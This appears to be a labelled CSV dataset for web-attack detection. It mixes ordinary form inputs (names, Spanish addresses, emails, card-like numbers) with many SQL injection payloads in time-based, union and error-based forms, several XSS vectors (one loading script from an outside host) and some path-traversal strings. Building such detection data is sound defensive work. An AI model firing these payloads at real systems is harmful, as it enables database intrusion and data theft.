payload,length,attack_type,label
-8729'+(select 'nbzl' where 7160=7160 order by 1#,49,sqli,anom
cullie,6,norm,norm
1') as twny where 9580=9580;begin dbms_lock.sleep(5); end--,59,sqli,anom
-8370')) or (3501=6407)*6407 and (('agcm' like 'agcm,52,sqli,anom
0al5a4,6,norm,norm
9607018610591675,16,norm,norm
"-5210"") where 7176=7176 or 6872=6872--",38,sqli,anom
83497200r,9,norm,norm
weihs,5,norm,norm
-pantufla,9,norm,norm
secretario espino 67 4?g,24,norm,norm
"1"") as ckoi where 4674=4674 union all select null,null,null,null,null,null,null,null,null,null#",95,sqli,anom
"-8966""))) or 1628=2712",22,sqli,anom
pereda barrio,13,norm,norm
10691,5,norm,norm
halpin,6,norm,norm
/................................................................................................................................................................{file},167,path-traversal,anom
"1'+(select uzan where 4312=4312 and make_set(3129=9555,9555))+'",63,sqli,anom
symington@portaldesign.md,25,norm,norm
"1%"") or 8514=benchmark(5000000,md5(0x544d5a4c))#",48,sqli,anom
"-1737' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'fsmd'='fsmd",218,sqli,anom
"-4606"") as elek where 8261=8261 or 8571=8571--",46,sqli,anom
eden,4,norm,norm
1') and 4822=6997 and ('ojku'='ojku,35,sqli,anom
"-2798'+(select 'emui' where 9565=9565 union all select 9565,9565,9565,9565--",76,sqli,anom
"1"")) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((""xqlh""=""xqlh",226,sqli,anom
letha,5,norm,norm
"1%') union all select null,null,null,null,null#",47,sqli,anom
"1%"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ""%""=""",103,sqli,anom
"1%""))) and 3824=benchmark(5000000,md5(0x76555642)) and (((""%""=""",63,sqli,anom
vindicacin,10,norm,norm
yuncos,6,norm,norm
37209,5,norm,norm
atab?a6ad7,10,norm,norm
jellison@acch-portugal.uk,25,norm,norm
monimiceo,9,norm,norm
"1%') union all select null,null,null,null,null,null,null--",58,sqli,anom
"avenida san francisco javier, 5,",32,norm,norm
piggot@necesitouncredito.np,27,norm,norm
786,3,norm,norm
descarada,9,norm,norm
geria,5,norm,norm
boring_besch@copiar.com.pg,26,norm,norm
12018831c,9,norm,norm
retamal,7,norm,norm
cuboides,8,norm,norm
"1"")) as qgwq where 6122=6122;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",96,sqli,anom
"1"")) and 8407=(select count(*) from generate_series(1,5000000)) and ((""jydy"" like ""jydy",87,sqli,anom
"1%' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and '%'='",73,sqli,anom
"1))) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",95,sqli,anom
9758111869432578,16,norm,norm
"1 and elt(3172=7243,7243)",25,sqli,anom
"make_set(5679=9769,9769)",24,sqli,anom
-8112'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('xopg'='xopg,215,sqli,anom
"<html xmlns:crosssitescripting><?import namespace=""crosssitescripting"" implementation=""http://ha.ckers.org/crosssitescripting.htc""><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>",228,xss,anom
iruraiz-gauna,13,norm,norm
nordes!tal,10,norm,norm
liduea mediero,14,norm,norm
"1%"")) rlike sleep(5)#",21,sqli,anom
lucidio,7,norm,norm
5068023807822442,16,norm,norm
"masia ca l'angel 39,",20,norm,norm
hoya-gonzalo,12,norm,norm
"-5779) union all select 6089,6089--",35,sqli,anom
"1%'))) union all select null,null,null,null,null#",49,sqli,anom
gdor,4,norm,norm
"1')) as umah where 3781=3781 union all select null,null,null,null#",66,sqli,anom
sykes,5,norm,norm
"1' and 3824=benchmark(5000000,md5(0x76555642)) and 'vmuj' like 'vmuj",68,sqli,anom
taneda@ajuntamentdebcn20.be,27,norm,norm
ret4ne3or,9,norm,norm
noviercas,9,norm,norm
5212720427288459,16,norm,norm
"-9440"" union all select 5599,5599,5599,5599,5599--",50,sqli,anom
orbegoso,8,norm,norm
towney,6,norm,norm
beecher@mailboxrussia.gu,24,norm,norm
3123820484071721,16,norm,norm
4780723426433072,16,norm,norm
1'))) and 4595=4595#,20,sqli,anom
6194,4,norm,norm
"1)) as aqpy where 4027=4027 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",129,sqli,anom
51842682s,9,norm,norm
"1"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""opgb"" like ""opgb",122,sqli,anom
oshea_knowles@tiaherminia.gh,28,norm,norm
bo722e6.8,9,norm,norm
469,3,norm,norm
1');select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,101,sqli,anom
10702,5,norm,norm
"-4210"") where 2679=2679 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",223,sqli,anom
47609,5,norm,norm
"1') where 3375=3375 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",121,sqli,anom
anja,4,norm,norm
nahir,5,norm,norm
27c01a,6,norm,norm
"1 union all select null,null,null,null#",39,sqli,anom
"-9941 union all select 1321,1321,1321,1321,1321,1321,1321#",58,sqli,anom
ailee1,6,norm,norm
"1""));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""nxvp""=""nxvp",82,sqli,anom
tatje sopesens,14,norm,norm
1) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),189,sqli,anom
1') where 1645=1645 rlike sleep(5)--,36,sqli,anom
nadeix laumann,14,norm,norm
"1 where 7362=7362 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",80,sqli,anom
1'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('cgiu'='cgiu,228,sqli,anom
pladeval berganciano,20,norm,norm
mckuen@ciaplast.cn,18,norm,norm
"-2920"")) as zdgv where 9702=9702 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",214,sqli,anom
38726,5,norm,norm
2787973107257855,16,norm,norm
1)) as wwys where 9248=9248;(select * from (select(sleep(5)))srmq)--,68,sqli,anom
"1') as yxdb where 4597=4597;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",111,sqli,anom
shemwell,8,norm,norm
"1""));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",98,sqli,anom
"1"" where 3329=3329 or sleep(5)--",32,sqli,anom
"1' where 4272=4272 union all select null,null,null,null#",56,sqli,anom
"1"") or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",110,sqli,anom
27784,5,norm,norm
1);select (case when (9343=9513) then 1 else 9343*(select 9343 from master..sysdatabases) end)--,96,sqli,anom
marciniu,8,norm,norm
5672,4,norm,norm
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('nopu'='nopu",123,sqli,anom
08263,5,norm,norm
macko@barebackespaa.mq,22,norm,norm
"-1040 where 3058=3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",90,sqli,anom
reencarnar,10,norm,norm
belonne santaella,17,norm,norm
polli7o,7,norm,norm
"1'||(select 'jmao' where 3009=3009;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",126,sqli,anom
amontona+r,10,norm,norm
"1)) as rroe where 4840=4840;select * from generate_series(3607,3607,case when (3607=4242) then 1 else 0 end) limit 1--",118,sqli,anom
-5830') as fivy where 2173=2173 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,126,sqli,anom
"1"" union all select null,null,null,null,null,null#",50,sqli,anom
pche,4,norm,norm
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",153,sqli,anom
"1%""))) and 7533=7533 and (((""%""=""",33,sqli,anom
"1%');select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",95,sqli,anom
c6rro5,6,norm,norm
26323,5,norm,norm
documet recasens,16,norm,norm
5765726970199338,16,norm,norm
"silo 179, 12?b",14,norm,norm
"1) as rnfb where 2405=2405 or 8514=benchmark(5000000,md5(0x544d5a4c))#",70,sqli,anom
"quinita flores 75,",18,norm,norm
44122,5,norm,norm
6estila$torio,13,norm,norm
"repeso 27,",10,norm,norm
1));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,101,sqli,anom
"1' where 6417=6417 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",160,sqli,anom
hu1garina,9,norm,norm
"1)) as oywa where 7951=7951 union all select null,null,null,null,null,null#",75,sqli,anom
burns40,7,norm,norm
enaciado,8,norm,norm
ibarra,6,norm,norm
"1') as mara where 7164=7164;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",88,sqli,anom
"1 where 9404=9404;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",108,sqli,anom
roca,4,norm,norm
01719,5,norm,norm
fortuny goyenaga,16,norm,norm
"espinar, el",11,norm,norm
kriko,5,norm,norm
en7repa2ecerse,14,norm,norm
"1%');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ('%'='",130,sqli,anom
"calle salou, 26, 12g",20,norm,norm
stiles,6,norm,norm
piwkowsk,8,norm,norm
leo,3,norm,norm
1);waitfor delay '0:0:5',24,sqli,anom
1' rlike sleep(5) and 'cugs'='cugs,34,sqli,anom
mazuela,7,norm,norm
"c/ paraguay 112,",16,norm,norm
11639,5,norm,norm
"1,(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(8979,8979,case when (8979=8979) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",221,sqli,anom
1%')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'=',220,sqli,anom
"-1917"") or 8571=8571--",22,sqli,anom
"1"")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""ksrh""=""ksrh",174,sqli,anom
"-7255' union all select 2127,2127,2127,2127,2127#",49,sqli,anom
"1%""))) union all select null,null,null,null,null--",50,sqli,anom
e$57ct918ena,12,norm,norm
"-4546') or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",202,sqli,anom
-9327') or 3038=3038,20,sqli,anom
martens,7,norm,norm
reggis,6,norm,norm
0552871486458535,16,norm,norm
gavota,6,norm,norm
"<style>@im\\port'\\ja asc ipt:alert(""crosssitescripting"")';</style>",65,xss,anom
"1""))) union all select null,null,null,null--",44,sqli,anom
"<img src=""http://www.vulnerability-lab.com/file.php?variables=malicious"">",73,xss,anom
hawi,4,norm,norm
terry@mtos.ar,13,norm,norm
steklasa,8,norm,norm
"-6116"")) union all select 3679,3679,3679,3679,3679,3679,3679--",62,sqli,anom
"1) where 7600=7600 union all select null,null,null,null,null,null--",67,sqli,anom
valverde de alcal,17,norm,norm
6336,4,norm,norm
-9393' where 3119=3119 or 8571=8571--,37,sqli,anom
86535075j,9,norm,norm
derch mallol,12,norm,norm
"c/ estornino s/n, 9f",20,norm,norm
"paseo francisco mir berlanga 141, 12-e",38,norm,norm
"-5438"") union all select 3170,3170--",36,sqli,anom
butarinski_sawyer@proofreader.fj,32,norm,norm
azcrate campalan,16,norm,norm
"1"")));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",73,sqli,anom
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",115,sqli,anom
dalenna,7,norm,norm
83320221f,9,norm,norm
riumors,7,norm,norm
"1) where 4573=4573;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",106,sqli,anom
"1')) as namw where 1740=1740 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",121,sqli,anom
2429988890930598,16,norm,norm
"1"") union all select null,null,null,null,null,null,null,null,null--",67,sqli,anom
46838,5,norm,norm
9167,4,norm,norm
"1"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""xhvo""=""xhvo",116,sqli,anom
"cardenal mendoza s/n, 7?h",25,norm,norm
p0cagallina,11,norm,norm
paterson,8,norm,norm
"1' union all select null,null,null,null--",41,sqli,anom
5515498437464021,16,norm,norm
4948118153450551,16,norm,norm
49721,5,norm,norm
desabor$ida,11,norm,norm
"1)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (5099=5099",214,sqli,anom
........web-infweb.xml,22,path-traversal,anom
16824275m,9,norm,norm
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ""%""=""",112,sqli,anom
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3",93,sqli,anom
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)-- dtha",138,sqli,anom
sevilleja de la jara,20,norm,norm
1') and (1471=7892)*7892 and ('kkok' like 'kkok,47,sqli,anom
betelu,6,norm,norm
"jose incenga 14,",16,norm,norm
1689,4,norm,norm
2797,4,norm,norm
paley,5,norm,norm
50163,5,norm,norm
"-5227"" union all select 2666--",30,sqli,anom
2116,4,norm,norm
"-4915' union all select 1928,1928,1928,1928#",44,sqli,anom
"1"")) as rign where 1604=1604 and 3661=3054--",44,sqli,anom
06656,5,norm,norm
"1' or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'nelb'='nelb",159,sqli,anom
"1"")) union all select null,null,null,null#",42,sqli,anom
joan de joanes 61 3?h,21,norm,norm
-9429') order by 1--,20,sqli,anom
"1%"")) union all select null,null,null,null,null,null,null,null,null#",68,sqli,anom
alh4a3,6,norm,norm
23690,5,norm,norm
"calle puebla de los infantes, 145",33,norm,norm
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",141,sqli,anom
"1'||(select 'blvu' from dual where 9813=9813;select count(*) from generate_series(1,5000000))||'",96,sqli,anom
"plaa esplanada, s/n 13-d",24,norm,norm
"1"")) as gprr where 5975=5975 and 2388=benchmark(5000000,md5(0x6d457153))#",73,sqli,anom
"<img src="" javascript:alert('crosssitescripting');"">",52,xss,anom
serban,6,norm,norm
"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270",108,sqli,anom
hightower@freetag.cl,20,norm,norm
4567,4,norm,norm
44750,5,norm,norm
"1'||(select 'lxpg' where 7390=7390 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",135,sqli,anom
73502486y,9,norm,norm
guayabo,7,norm,norm
"-2067"" or 3038=3038",19,sqli,anom
siu-kwok,8,norm,norm
bl!teo,6,norm,norm
calle rafael villa 41,21,norm,norm
1') and 2564=3234--,19,sqli,anom
1%') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'=',196,sqli,anom
"1%"") or elt(5873=5873,sleep(5))#",32,sqli,anom
raynor,6,norm,norm
1'+(select soqk where 5383=5383;select pg_sleep(5)--,52,sqli,anom
"plaza pont 47, 6?e",18,norm,norm
queila,6,norm,norm
walpole@magentalgtb.zw,22,norm,norm
"1))) union all select null,null,null,null,null,null,null,null,null,null--",73,sqli,anom
kepinska@manuelpaloma.asia,26,norm,norm
4456163671536679,16,norm,norm
9998088000737716,16,norm,norm
0406141531828732,16,norm,norm
1290238048117290,16,norm,norm
hemilce,7,norm,norm
"1') and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ('rgue' like 'rgue",101,sqli,anom
afijacin,8,norm,norm
bethania,8,norm,norm
"romana, la",10,norm,norm
7492,4,norm,norm
"ametlla de mar, l'",18,norm,norm
62,2,norm,norm
harmony,7,norm,norm
-9556') where 2472=2472 or (2883=9968)*9968--,45,sqli,anom
-9434') union all select 3106#,30,sqli,anom
"-6014"" or make_set(3003=2609,2609)",34,sqli,anom
"<style>li {list-style-image: url(""javascript:alert('xss')"");}</style><ul><li>xss",80,xss,anom
"c/ animas, 101,",15,norm,norm
"1%'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('%'='",119,sqli,anom
garvn,5,norm,norm
c/ bandera 125 8-c,18,norm,norm
narella,7,norm,norm
cuccu@professionalhosting.com.uz,32,norm,norm
perrier,7,norm,norm
0cep8o,6,norm,norm
22167302v,9,norm,norm
puebla de obando,16,norm,norm
huyente,7,norm,norm
novikoff@schnapps.com.cl,24,norm,norm
"1) and 2388=benchmark(5000000,md5(0x6d457153))#",47,sqli,anom
49210905j,9,norm,norm
0esh6red32,10,norm,norm
"1%"")) and 8594=(select 8594 from pg_sleep(5))--",47,sqli,anom
8457,4,norm,norm
"1);iif(5462=8866,1,1/0)",23,sqli,anom
cowling@minimizar.bz,20,norm,norm
ser?ado,7,norm,norm
"1'||(select 'kyhs' from dual where 9491=9491;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",129,sqli,anom
hine7,5,norm,norm
09341,5,norm,norm
frank@soymuyguapa.tn,20,norm,norm
1' in boolean mode);(select * from (select(sleep(5)))acdk)#,59,sqli,anom
sevilla,7,norm,norm
lazlo,5,norm,norm
"1)) as debc where 7428=7428 union all select null,null,null#",60,sqli,anom
alternat,8,norm,norm
9639622169891672,16,norm,norm
"calle mendoza, 7,",17,norm,norm
6748546919009265,16,norm,norm
1'||(select 'feki' where 4082=4082 and (3587=4207)*4207)||',59,sqli,anom
derio,5,norm,norm
mckee,5,norm,norm
"1) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",204,sqli,anom
ichizen,7,norm,norm
7269,4,norm,norm
"1') as qaec where 6572=6572 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",179,sqli,anom
15124,5,norm,norm
"<table background=""javascript:document.cookie=true;"">",53,xss,anom
9ar5i04o,8,norm,norm
"1"") where 6903=6903;select (case when (8808=1367) then 1 else 8808*(select 8808 from master..sysdatabases) end)--",113,sqli,anom
6603392129925704,16,norm,norm
"1',(select (case when (6948=4654) then 1 else 6948*(select 6948 from mysql.db) end))",84,sqli,anom
buf mueton,10,norm,norm
vilaller,8,norm,norm
1' where 9544=9544;(select * from (select(sleep(5)))acdk)#,58,sqli,anom
25938703q,9,norm,norm
schumann@mmo.com.bs,19,norm,norm
calle orotava 31,16,norm,norm
-1217'))) order by 1#,21,sqli,anom
31392,5,norm,norm
1'||(select 'mlwj' from dual where 4247=4247 and 1702=8469)||',62,sqli,anom
"1%"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""%""=""",60,sqli,anom
bardischewski9@sexotelefono.rw,30,norm,norm
pistan robredo,14,norm,norm
/////{file},11,path-traversal,anom
1901048287713824,16,norm,norm
3920119286282198,16,norm,norm
1em5le28r,9,norm,norm
2720344476520602,16,norm,norm
aulakh,6,norm,norm
57rsant2541,11,norm,norm
45914021h,9,norm,norm
"-8279"" union all select 6598,6598,6598,6598,6598,6598,6598,6598#",64,sqli,anom
velilla de san antonio,22,norm,norm
wilmont,7,norm,norm
meleskie,8,norm,norm
riega girme,11,norm,norm
"1'))) union all select null,null,null,null--",44,sqli,anom
"1')));call regexp_substring(repeat(right(char(2385),0),500000000),null)--",73,sqli,anom
entregadora,11,norm,norm
"-4543"") or 3038=3038",20,sqli,anom
"1')) as hrra where 9533=9533 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",169,sqli,anom
"-3868')) or make_set(6809=1236,1236) and (('evnj'='evnj",55,sqli,anom
"1)));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",95,sqli,anom
c/ la calzada 10,16,norm,norm
"1%"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",194,sqli,anom
zamora,6,norm,norm
0614375180233873,16,norm,norm
3553,4,norm,norm
"1"" where 4073=4073 rlike (select (case when (8716=4281) then 1 else 0x28 end))--",80,sqli,anom
muoz capato,11,norm,norm
fabien,6,norm,norm
"1 where 6077=6077 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",126,sqli,anom
franey_travers@hayunmundoahifuera.br,36,norm,norm
villahermosa del ro,19,norm,norm
"1' and elt(4249=4249,7259) and 'awjd'='awjd",43,sqli,anom
enedn,5,norm,norm
6302817063301722,16,norm,norm
weld@yiutuve.vc,15,norm,norm
70996380a,9,norm,norm
8231060336250168,16,norm,norm
"-8245"")) or 3038=3038",21,sqli,anom
"1"")) rlike (select * from (select(sleep(5)))vwyq)#",50,sqli,anom
cecile,6,norm,norm
1) waitfor delay '0:0:5' and (2993=2993,39,sqli,anom
aarn,4,norm,norm
"1"" and 1668=8288",16,sqli,anom
morocz,6,norm,norm
povedilla,9,norm,norm
34473,5,norm,norm
comparaz albareda,17,norm,norm
"calle transversal de poniente, 71,",34,norm,norm
rogan-darrieux@rocofer.tc,25,norm,norm
84304826m,9,norm,norm
shirleen,8,norm,norm
"-1390%"")) union all select 8930,8930,8930,8930,8930#",52,sqli,anom
"carrer panama, 27 8e",20,norm,norm
"-5165')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('zpnv' like 'zpnv",227,sqli,anom
"<link rel=""stylesheet"" href=""javascript:alert('xss');"">",55,xss,anom
toa,3,norm,norm
juifen5,7,norm,norm
"1') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('kejy'='kejy",112,sqli,anom
saunders@titulosoficiales.web,29,norm,norm
"carretera aravaca a carabanchel, 194 8-e",40,norm,norm
"1%"" and 2006=2006",17,sqli,anom
7a7i86,6,norm,norm
pettingill@demasiado.com.bv,27,norm,norm
gu5cima,7,norm,norm
"-6263"" union all select 8005,8005#",34,sqli,anom
wolowidn,8,norm,norm
kenna.losch@lapasteleria.co,27,norm,norm
thuong,6,norm,norm
"avinguda doctor vilaseca, s/n,",30,norm,norm
coch soto,9,norm,norm
"1)) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((3102=3102",149,sqli,anom
6470509098489788,16,norm,norm
"-8200' where 3422=3422 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",219,sqli,anom
"calle costa de llevant, 52",26,norm,norm
gimialcn,8,norm,norm
besch@qcole.bt,14,norm,norm
ofrecedor,9,norm,norm
"calle alonso nuez 186, 12?b",27,norm,norm
"-1422%"") or make_set(9539=9519,9519) and (""%""=""",47,sqli,anom
indemostrable,13,norm,norm
noris,5,norm,norm
jane@23horas.ua,15,norm,norm
4108680786714852,16,norm,norm
s134a+reo,9,norm,norm
"calle andorra, 191, 8-g",23,norm,norm
"-2153'||(select 'sofs' where 4126=4126 union all select 4126,4126,4126,4126,4126#",81,sqli,anom
resmini@barebackspain.yu,24,norm,norm
xanto,5,norm,norm
"fierro 66, 3?e",14,norm,norm
baziuk4,7,norm,norm
"1%"") or (select * from (select(sleep(5)))ydpu) and (""%""=""",57,sqli,anom
8421938464583223,16,norm,norm
91328189l,9,norm,norm
-8163)) as cvai where 2360=2360 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,219,sqli,anom
plaza oficios 22,16,norm,norm
"1'+(select vlut where 9517=9517 union all select null,null,null--",65,sqli,anom
72484997z,9,norm,norm
"c/ barri del polvori, 77",24,norm,norm
coca de alba,12,norm,norm
nardi borgua,12,norm,norm
ronaldso,8,norm,norm
-5708 where 3134=3134 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,116,sqli,anom
"1"")) as zgig where 5748=5748 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",226,sqli,anom
peafiel,7,norm,norm
2417733801163656,16,norm,norm
37662577p,9,norm,norm
"-3997'+(select 'avjk' where 1917=1917 union all select 1917,1917,1917--",71,sqli,anom
17rdiflo4a,10,norm,norm
20654328y,9,norm,norm
"-1236'+(select 'fbgh' where 3896=3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",101,sqli,anom
"c/ venus 91, 1e",15,norm,norm
"c/ duran 52,",12,norm,norm
"1%"");select (case when (9732=7136) then 9732 else 9732*(select 9732 from information_schema.character_sets) end)#",113,sqli,anom
inescourt7@citycvs.mil,22,norm,norm
3090147546194865,16,norm,norm
"calle sant erasme, 81",21,norm,norm
potel ivars,11,norm,norm
timmons,7,norm,norm
orieta,6,norm,norm
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('inrm' like 'inrm",72,sqli,anom
1' where 1652=1652 and sleep(5)#,32,sqli,anom
eddier,6,norm,norm
de asbaje abarzuza,18,norm,norm
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('efwq' like 'efwq",128,sqli,anom
